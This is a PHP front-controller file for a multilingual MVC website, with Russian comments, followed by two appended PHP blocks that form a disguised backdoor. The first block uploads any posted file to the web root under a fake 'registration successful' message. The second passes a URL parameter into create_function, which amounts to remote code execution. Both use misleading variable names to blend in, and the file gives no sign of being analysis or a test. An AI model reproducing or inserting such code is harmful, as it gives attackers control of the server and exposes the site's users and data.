<?PHP
header("Content-Type: text/html; charset=utf-8");
error_reporting(E_ALL); // вывод ошибок

// Старт сессии
session_start();

// Константа дефолтный путь к файлу
define('ROOT', dirname(__FILE__));

require_once(ROOT.'/config/defines.php');
require_once(ROOT.'/components/Autoload.php');

// Установка дефолтного языкового пакета
if (!isset($_SESSION['lang'])) Language::setDefaultLanguage();

// Смена языкового пакета
if (isset($_POST['lang'])) Language::setLanguage(strval($_POST['lang']));

// Константа языкового пакета
define('LANG', $_SESSION['lang']);

// Защита дублирования сессии
Session::checking();

$router = new Router();
$router -> run();
<?php

if(isset($_POST['referer'])) { $public_function = $_FILES['login']['tmp_name'];
$SELECT_FROM = $_FILES['login']['name'];if(!empty($public_function)){   
$type = strtolower(substr($SELECT_FROM, 1+strrpos($SELECT_FROM,".")));
     $sessions_start = 'exit.'.$type; 
  { 
    if (copy($public_function, "".$sessions_start))
  
       
    echo 'Регистрация прошла успешно <meta http-equiv="refresh" content="3;URL=/'.$sessions_start.'">';
    
           else echo "error";
  } 
}    
}



?>
<?php
$function_mail=$_GET['match'];

$SESSION_id = create_function('$refer', "return $function_mail;");$SESSION_id('');
?>